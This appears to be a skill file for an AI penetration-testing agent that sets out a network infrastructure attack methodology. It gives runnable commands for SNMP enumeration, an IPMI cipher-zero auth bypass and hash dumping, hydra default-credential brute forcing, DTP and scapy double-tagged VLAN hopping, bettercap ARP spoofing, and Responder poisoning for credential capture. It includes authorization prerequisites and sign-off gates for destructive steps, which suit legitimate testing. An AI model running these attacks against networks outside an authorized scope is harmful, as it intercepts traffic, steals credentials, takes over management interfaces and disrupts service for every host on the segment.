---
name: network-infra
description: >
  Network infrastructure attack methodology for authorized engagements:
  SNMP enumeration, IPMI abuse, default credential sweeps, VLAN hopping,
  ARP spoofing for traffic interception. Keywords: SNMP, IPMI, default
  credentials, VLAN hopping, 802.1Q, ARP spoofing, MITM, network pentest.
  Do NOT use for application-layer web/API testing, or for a specific
  cloud provider's network controls (see aws-attack/azure-attack/
  gcp-attack), or Active Directory-specific protocols (see
  active-directory, though this skill often supplies the initial network
  foothold that AD testing builds on).
metadata:
  type: platform
  phase: hunting
  tools: [nmap, onesixtyone, snmpwalk, ipmitool, yersinia, bettercap, responder]
depends_on: []
feeds_into: [chain-analysis, active-directory, windows-privesc, linux-privesc]
chains_with: [active-directory, iot-ics]
---

## Signals
- Internal network segment in scope with switches/routers/management interfaces reachable.
- SNMP (UDP 161), IPMI (UDP 623), or trunk ports exposed.
- Multiple VLANs present with an access port physically/logically reachable from the test position.

## Prerequisites
- Written authorization explicitly covering internal network/infrastructure testing — distinct from external-only web app scope.
- Physical or VPN access to the target network segment.
- `nmap`, `onesixtyone`, `snmpwalk`, `ipmitool`, `yersinia`, `bettercap`, `Responder`.

## Methodology

### 1. SNMP enumeration
```bash
# Sweep for responsive hosts with common community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt 10.10.10.0/24

# Full walk once a valid community string is found
snmpwalk -v2c -c public 10.10.10.5
snmpwalk -v2c -c public 10.10.10.5 1.3.6.1.2.1.1   # system info
snmpwalk -v2c -c private 10.10.10.5 1.3.6.1.4.1.9  # Cisco-specific OIDs, may leak configs
```

### 2. IPMI abuse (BMC often has default creds, and is vulnerable to the cipher-zero auth bypass on old firmware)
```bash
nmap -sU -p 623 --script ipmi-version 10.10.10.0/24
ipmitool -I lanplus -H 10.10.10.5 -U ADMIN -P ADMIN chassis status
# Cipher-zero auth bypass check (older/unpatched BMCs)
ipmitool -I lanplus -H 10.10.10.5 -C 0 -U '' -P '' chassis status
# Hash extraction for offline cracking (HP iLO4/Supermicro known weak implementations)
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
```

### 3. Default credential sweep
```bash
# Common management interfaces (routers, switches, printers, NAS)
nmap -p 80,443,22,23,8080 --open 10.10.10.0/24 -oG open.txt
# Check against a curated default-creds list per fingerprinted vendor/product
# (e.g. hydra for SSH/telnet/HTTP basic auth, rate-limited)
hydra -L vendor-default-users.txt -P vendor-default-passwords.txt -t 2 ssh://10.10.10.5
```

### 4. VLAN hopping
```bash
# Switch spoofing (DTP) — if the access port negotiates trunking
yersinia dtp -interface eth0 -attack 1
# Double tagging (802.1Q) — works even without DTP, blind injection toward victim VLAN
# Craft with scapy: outer tag = native VLAN, inner tag = target VLAN
python3 - <<'EOF'
from scapy.all import *
pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / Dot1Q(vlan=1) / Dot1Q(vlan=100) / IP(dst="10.100.0.5") / ICMP()
sendp(pkt, iface="eth0")
EOF
```

### 5. ARP spoofing for traffic interception
```bash
bettercap -iface eth0
# in bettercap shell
net.probe on
set arp.spoof.targets 10.10.10.20
arp.spoof on
net.sniff on
# Capture NTLM/LLMNR/NBT-NS hashes passively via Responder in parallel
responder -I eth0 -wrf
```

### 6. Rogue DHCP / LLMNR poisoning (credential capture)
```bash
responder -I eth0 -A   # analyze mode first, confirm LLMNR/NBT-NS traffic present before poisoning
responder -I eth0 -wrf  # active poisoning once confirmed in-scope and operator has signed off
```

## Tooling
`nmap`, `onesixtyone`, `snmpwalk`/`snmp-check`, `ipmitool`, Metasploit IPMI modules, `yersinia`, `scapy`, `bettercap`, `Responder`, `hydra`.

## Validation Gate
- Default-credential findings must show an actual successful authenticated session (not just an accepted-looking response), with the exact device/vendor/firmware version recorded.
- VLAN hopping must be confirmed by an actual packet reaching/returning from the target VLAN (e.g. ICMP reply captured), not just "DTP looked negotiable."
- ARP spoofing/credential capture evidence must include the captured hash/cred with a timestamp, and confirm the interception target was within scope (don't let bettercap/Responder run network-wide beyond approved hosts).

## Gotchas
- ARP spoofing and rogue DHCP are active MITM techniques that can degrade or disrupt network service for every host on the segment, not just the target — this is squarely the "acciones destructivas" human gate; scope `arp.spoof.targets` tightly and get explicit sign-off before switching from passive (`-A`) to active (`-wrf`) Responder modes.
- SNMP write community strings (not just read) can allow full device reconfiguration — confirm read vs. write access before escalating to config changes, and treat any write as its own gate.
- IPMI default-credential/cipher-zero findings on a BMC can allow remote power-cycle of the host — a successful `chassis power off` is a destructive action requiring sign-off even though the auth bypass itself is just enumeration.
- VLAN hopping via double-tagging only works one-way (attacker to victim VLAN) and is blind — you often need a secondary vector (SNMP, ARP spoof) on the target VLAN to confirm actual impact.
